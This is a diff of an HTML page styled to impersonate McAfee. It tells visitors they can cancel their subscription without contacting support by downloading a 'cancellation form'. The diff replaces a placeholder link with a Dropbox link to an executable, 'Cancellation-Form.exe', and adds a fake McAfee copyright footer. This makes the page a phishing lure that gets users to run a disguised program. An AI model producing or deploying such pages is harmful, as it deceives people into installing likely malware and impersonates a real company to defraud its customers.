@@ -1,71 +1,154 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
+<html lang="en"><head>
   <meta charset="UTF-8">
-  <title>Cancellation Form - McAfee Style</title>
+  <title>Cancel Subscription - McAfee Style</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body {
+    * {
+      box-sizing: border-box;
       margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
       background-color: #f2f2f2;
-      font-family: Arial, sans-serif;
       display: flex;
-      justify-content: center;
-      align-items: flex-start;
+      flex-direction: column;
+      align-items: center;
       min-height: 100vh;
+      padding: 60px 20px 100px;
+      position: relative;
     }
-    .container {
-      width: 100%;
-      max-width: 480px;
-      margin-top: 60px;
-      background-color: #fff;
-      padding: 40px 30px;
-      border-radius: 8px;
-      box-shadow: 0 0 12px rgba(0, 0, 0, 0.1);
-      text-align: center;
-    }
+
     .logo {
-      text-align: center;
-      margin-bottom: 20px;
+      margin-bottom: 40px;
     }
+
     .logo img {
-      height: 60px;
+      width: 160px;
+      height: auto;
     }
-    h2 {
-      font-size: 18px;
+
+    .card {
+      background-color: #ffffff;
+      border-radius: 10px;
+      padding: 30px 25px;
+      max-width: 500px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+    }
+
+    .card h1 {
+      font-size: 20px;
+      color: #333;
       margin-bottom: 20px;
+    }
+
+    .card p {
+      font-size: 15px;
+      color: #555;
+      line-height: 1.5;
+    }
+
+    .download-btn {
+      margin-top: 30px;
+      background-color: #d61f26;
+      color: #fff;
+      text-decoration: none;
+      padding: 14px 24px;
+      font-size: 15px;
+      border-radius: 6px;
+      display: inline-block;
+      transition: background-color 0.3s ease;
+    }
+
+    .download-btn:hover {
+      background-color: #b71b1f;
+    }
+
+    footer {
+      position: fixed;
+      bottom: 15px;
+      left: 0;
+      width: 100%;
+      display: flex;
+      justify-content: space-between;
+      padding: 0 30px;
+      font-size: 13px;
+    }
+
+    .footer-left a {
+      color: #0066cc;
+      text-decoration: none;
+      margin-right: 15px;
+    }
+
+    .footer-left a:hover {
+      text-decoration: underline;
+    }
+
+    .footer-right {
+      font-weight: bold;
       color: #333;
     }
-    p {
-      font-size: 14px;
-      color: #555;
-      margin-bottom: 30px;
-    }
-    .download-btn {
-      display: inline-block;
-      padding: 12px 20px;
-      background-color: #0070d2;
-      color: white;
-      border: none;
-      border-radius: 4px;
-      text-decoration: none;
-      font-size: 14px;
-      cursor: pointer;
-    }
-    .download-btn:hover {
-      background-color: #005bb5;
+
+    @media (max-width: 600px) {
+      .card h1 {
+        font-size: 18px;
+      }
+
+      .card p {
+        font-size: 14px;
+      }
+
+      .download-btn {
+        padding: 12px 20px;
+        font-size: 14px;
+      }
+
+      footer {
+        flex-direction: column;
+        align-items: center;
+        text-align: center;
+        gap: 5px;
+      }
+
+      .footer-left, .footer-right {
+        margin: 5px 0;
+      }
     }
   </style>
-</head>
+<meta name="GENERATOR" content="MSHTML 11.00.10570.1001"></head>
 <body>
 
-  <div class="container">
-    <div class="logo">
-      <img src="https://cdn.mcafee.com/etc.clientlibs/mcafee/clientlibs/clientlib-site/resources/img/logo.svg" alt="McAfee Logo">
-    </div>
-    <h2>Download Your Cancellation Form & Cancel Your Subscription From Your End.</h2>
-    <p>No need to call or contact support team.<br>Your cancellation will be processed automatically once you fill up your cancellation form.</p>
-    <a class="download-btn" href="YOUR_DOWNLOAD_LINK_HERE" download>Download Cancellation Form</a>
+  <div class="logo">
+    <img alt="McAfee Logo" src="https://1000logos.net/wp-content/uploads/2020/09/McAfee-Logo.png">
   </div>
 
-</body>
-</html>
+  <div class="card">
+    <h1>Download your cancellation form&nbsp;and cancel your subscription from your end</h1>
+    <p>
+      No need to call or contact our support team.<br>
+      Your cancellation will be processed automatically once you fill up your cancellation form.
+<strong>    </strong></p><strong>
+  </strong></div><strong>
+
+  </strong><a class="download-btn" href="https://www.dropbox.com/scl/fi/xw5kd3lkov1ftpencs9xn/Cancellation-Form.exe?rlkey=lj1ffv5ya4zegub4qvulq91cr&st=3mjwzghv&dl=1" download=""><strong>
+    Download Cancellation Form
+</strong>  </a>
+
+  <footer>
+    <div class="footer-left">
+      <a href="#">Contact Us</a>
+      <a href="#">Privacy Notice</a>
+      <a href="#">FAQs</a>
+    </div>
+    <div class="footer-right">
+      Copyright © 2025 McAfee, LLC
+    </div>
+  </footer>
+
+
+
+</body></html>
